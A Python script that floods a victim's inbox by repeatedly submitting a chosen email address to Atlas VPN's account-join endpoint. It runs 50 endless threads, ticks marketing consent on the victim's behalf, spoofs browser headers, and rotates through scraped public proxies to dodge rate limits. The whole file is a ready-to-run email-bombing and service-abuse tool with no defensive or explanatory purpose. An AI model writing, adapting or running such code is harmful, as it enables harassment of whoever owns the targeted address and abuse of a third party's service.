import requests
import random
import threading


def send_requests(email, thread_num):
    i = 0
    proxy_index = 0
    proxies = requests.get('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt').text.strip().split('\n')
    while True:
        if i % 50 == 0:
            proxy_index = random.randint(0, len(proxies)-1)
        proxy = {'http': proxies[proxy_index], 'https': proxies[proxy_index]}
        try:
            # First request
            response1 = requests.post('https://user.atlasvpn.com/v1/request/join', headers={
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                'dnt': '1',
                'origin': 'https://account.atlasvpn.com',
                'referer': 'https://account.atlasvpn.com/',
                '^sec-ch-ua': '^\\^Brave^\\^;v=^\\^123^\\^, ^\\^Not:A-Brand^\\^;v=^\\^8^\\^, ^\\^Chromium^\\^;v=^\\^123^\\^^',
                'sec-ch-ua-mobile': '?0',
                '^sec-ch-ua-platform': '^\\^Windows^\\^^',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'x-client-id': 'Web',
            }, json={
                'email': email,
                'marketing_consent': True
            }, proxies=proxy)

            # Second request
            response2 = requests.options('https://user.atlasvpn.com/v1/request/join', headers={
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'access-control-request-headers': 'content-type,x-client-id',
                'access-control-request-method': 'POST',
                'dnt': '1',
                'origin': 'https://account.atlasvpn.com',
                'referer': 'https://account.atlasvpn.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            })

            if response1.status_code == 200 and response2.status_code == 200:
                print(f"[{thread_num}:{i}] Successfully sent both requests.")
            else:
                print(f"[Thread: {thread_num}  Email:{i}] Failed to send one or both requests.")
        except Exception as e:
            print(f"[Thread: {thread_num}  Email:{i}] Failed to send requests using proxy: {proxy}. Error: {e}")
        i += 1

def main():
    email = input("Enter email: ")
    threads = []
    for i in range(50):
        t = threading.Thread(target=send_requests, args=(email, i))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
